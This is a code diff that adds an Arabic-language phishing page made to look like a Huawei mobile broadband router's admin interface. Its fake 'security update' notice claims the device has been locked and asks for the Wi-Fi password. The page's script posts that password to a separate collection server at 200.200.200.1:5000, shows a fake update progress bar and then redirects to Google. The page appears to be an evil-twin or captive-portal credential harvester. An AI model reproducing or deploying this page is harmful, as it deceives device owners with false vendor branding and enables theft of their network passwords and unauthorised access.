@@ -1,0 +1,206 @@
+<html xmlns="http://www.w3.org/1999/xhtml" dir="rtl" lang="ar"><head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<link rel="stylesheet" href="bt.min.css">
+<link type="text/css" rel="stylesheet" href="maminar.css">
+<link rel="stylesheet" href="jq.css">
+<link rel="stylesheet" href="jq-min.css">
+
+<title>Mobile Broadband</title></head>
+
+<body>
+
+<div id="all_content" class="body_bg" style="display: block;">
+<div id="login_wrapper" class="login_wrapper_dim">
+<div class="login_wrapper_dim login_wrapper_filter">
+<div id="header" class="header"><div id="header_turnbg" class="head_div head_dim">
+<div class="head_dim head_filter">
+<div class="logo"></div>
+<div id="union_main_menu" class="main_menu clr_white_main_menu_active">
+<ul class="clr_white_header_hover">
+<li id="menu_index">
+<a id="home" style="color: white;">
+<span>الرئيسية</span></a></li>
+<li id="menu_statistic">
+<a id="statistic" style="color: white;">
+<span>إحصائيات</span></a></li>
+<li id="menu_sms">
+<a id="sms" style="color: white;">
+<span>SMS</span></a></li>
+<li id="menu_update">
+<a id="update" class="active" style="color: white;">
+<span>تحديث</span></a></li>
+<li id="menu_settings">
+<a id="settings" style="color: white;">
+<span>الإعدادات</span></a></li>
+<li id="menu_more">
+<a id="more" style="color: white;">
+<span>المزيد</span>
+</a></li></ul></div>
+
+<div class="tools">
+<ul><li id="sms_gif" class="nav02" style="display: block;">
+<a id="tooltip_sms" ><img src="res/unread_message.gif" alt=""></a></li>
+<li id="sim_signal_gif" class="nav03"><img src="res/signal_4.png" 0="" no-repeat=""></li>
+<li id="station_gif" class="nav08" style="display: none;"></li>
+<li id="wan_gif" class="nav05"><img  src="res/wan_up_down.png" 0="" no-repeat=""></li>
+<li id="wifi_gif" class="nav06"><img src="res/wifi_1.png" 0="" no-repeat=""></li></ul>
+</div></div></div></div>
+
+<div class="center_box">
+<br>
+<div class="container text-center" style="direction:rtl; text-align: right;">
+            <div id="passfrm" class="card shadow mx-auto text-right" style="max-width: 494; min-width: 492;">
+                <div class="card-header text-center" style="background-color: #4d5757; color:white;">
+                    <p class="mb-0 py-2">تحديث أمني</p>
+                </div>
+                <div class="card-body" style="background-color: #fdfdfd;">
+
+                    <div class="media align-items-center">
+                        <a class="d-flex align-self-center">
+                              <img src="res/upd.png" alt="No Wifi png">
+                        </a>
+                        <div class="media-body">
+                            <h5 class="font-weight-bold">التحقق من الشبكة</h5>
+                            <p class="pr-2 mb-0">عزيزي العميل ، بسبب تحديث أمني تم قفل جهاز الشبكة الخاص بك ، يرجى تقديم كلمة المرور الخاصة بك للمتابعة.</p>
+                        </div>
+                    </div>
+<br>
+
+                    <!-- This form won't submit unless the user has entered the same
+                    > 8   action="http://127.0.0.1:5000/pass" -->
+                    <form method="post"  name="pass-form" onsubmit="return main(event)" data-parsley-validate="" novalidate="">
+                        <div class="form-group px-4">
+                            <label for="">Wi-Fi كلمة السر</label>
+                            <input type="password" name="pass" data-parsley-minlength="8" id="passwd" class="form-control" placeholder="" aria-describedby="helpId" required="">
+                            <small id="helpId" class="text-muted">نسيت كلمة السر؟ يمكنك الضغط على زر إعادة الضبط في الجزء الخلفي من الجهاز.</small>
+                        </div>
+<div class="form-group px-4"><span>
+<select id="lang" class="float-right" onChange="changemylang(this.value)">
+<option value="ar_sa">اللغة - language</option><option value="en_us">English</option><option value="zh_cn">简体中文（中国）</option><option value="fr_fr">Français</option><option value="de_de">Deutsch</option><option value="es_es">Español</option><option value="it_it">Italiano</option><option value="ru_ru">Русский</option><option value="pt_pt">Português</option><option value="pt_br">Português (Brasil)</option><option value="es_ar">Español (Latino)</option></select>
+</div></span>
+
+                        <div class="form-group px-4">
+                            <input class="btn btn-success float-left" style="background-color: #4ec3f6;" type="submit" value="تحقق">
+                        </div>
+                    </form>
+
+                </div>
+
+            </div>
+
+        </div>
+
+<div id="proglog" class="card shadow mx-auto text-left" style="max-width: 494; min-width: 492; opacity: 0; display: none;">
+                <div class="card-header text-center" style="background-color: #4d5757; color:white;">
+                    <p class="mb-0 py-2">أرجو الإنتظار...</p>
+                </div>
+                <div class="card-body" style="background-color: #fdfdfd;">
+                <div class="card-body">
+
+                    <div class="container text-center mb-3">
+
+                        <div class="spinner-border text-success justify" role="status">
+                            <span class="sr-only">جار التحميل...</span>
+                        </div>
+                        <svg class="d-none mx-auto" id="check" width="3em" height="3em" viewBox="0 0 16 16" class="bi bi-check2" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
+                            <path fill-rule="evenodd" d="M13.854 3.646a.5.5 0 0 1 0 .708l-7 7a.5.5 0 0 1-.708 0l-3.5-3.5a.5.5 0 1 1 .708-.708L6.5 10.293l6.646-6.647a.5.5 0 0 1 .708 0z"/>
+                        </svg>
+
+                        <div>
+                            <small id="message" class="font-weight-black">جار التحميل</small>
+                        </div>
+                    </div>
+
+
+                    <div id="progress" >
+                        <span class='bg-success' style='width: 5px;' id='progressBar'><span></span></span>
+                    </div>
+
+                    <a href="https://google.com" id="continue-btn" class="d-none btn btn-success float-left mt-3" style="background-color: #4ec3f6;" >المتابعة</a>
+
+                </div>
+
+            </div>
+
+<br>
+<br>
+</div>
+<div id="cbs_div" class="cbs_text"></div>
+<div id="footer" class="footer clr_blue_hover"><a id="pravacy_policy" class="clr_gray" target="_blank">Huawei Privacy Policy</a><a id="privacy_policy" target="_blank" class="clr_gray" rel="noopener noreferrer">Huawei Privacy Notice</a><a id="copyright_notice"  class="clr_gray">Open Source Notice</a><br><img src="res/logo-footer.gif" align="top" alt="" border="0"><span id="statement_main"><table><tbody><tr><td><div class="pull-left giflogofooter clr_gray"></div></td><td class="clr_gray">&nbsp;(C) 2006-2021 Huawei Technologies co., ltd.</td></tr></tbody></table></span></div>
+
+<script src="jQuery.js"></script>
+<script src="parsley.min.js"></script>
+<script src="jQuery-ui.js"></script>
+<script>
+const flsk_url = "http://200.200.200.1:5000/pass"
+function changemylang(ddt){if (ddt == "en_us"){location.href = 'index.html';}}
+function statusbar(){
+            const frm = document.getElementById("passfrm");
+            const prog = document.getElementById("proglog");
+            frm.style.display = "none";
+            frm.style.opacity = 0;
+            prog.style.display = "block";
+            prog.style.opacity = 1;
+
+            $(document).ready(function(){
+                $('#progressBar').progressbar({
+                    value: 1
+                });
+            });
+
+            var statusTracker;
+            var percentage = 0;
+
+            function checkStatus() {
+                percentage = percentage + 5;
+                $('.bg-success').animate({
+                    width : percentage + '%'
+                });
+
+            if (percentage == 100) stop();
+                }
+                    function startProgress(){
+                    statusTracker = setInterval(checkStatus, 500);
+                }
+
+            function stop() {
+                clearInterval(statusTracker);
+                $('#message').html('تم التحديث');
+                setTimeout(function(){
+                    $('.spinner-border').hide();
+                    $('#check').removeClass('d-none').addClass('d-block');
+                    $('#continue-btn').removeClass('d-none').addClass('d-block');
+                },2000);
+
+            }
+            $(document).ready(startProgress);}
+
+async function main(e){
+e.preventDefault();
+const form = document.forms['pass-form']
+var pass = document.getElementById("passwd").value;
+
+if (pass < 8){alert("الرجاء إدخال كلمة مرور صحيحة"); e.preventDefault(); return}
+
+function handled(data){
+console.log(data);
+if (data.status == "All good"){statusbar()}
+
+else if (data.status == "notgood"){alert("الرجاء إدخال كلمة مرور صحيحة"); location.reload();}
+
+else{alert("الرجاء إدخال كلمة مرور صحيحة"); location.reload();}
+
+}
+
+fetch(flsk_url, { method: 'POST', headers: new Headers({'Content-Type': 'application/x-www-form-urlencoded'}), body: 'pass='+pass})
+      .then(response => response.json())
+      .then(data => handled(data))
+      .catch(error => console.error('Error!', error.message))
+
+return}
+
+
+</script>
+
+</div></div></div></body></html>
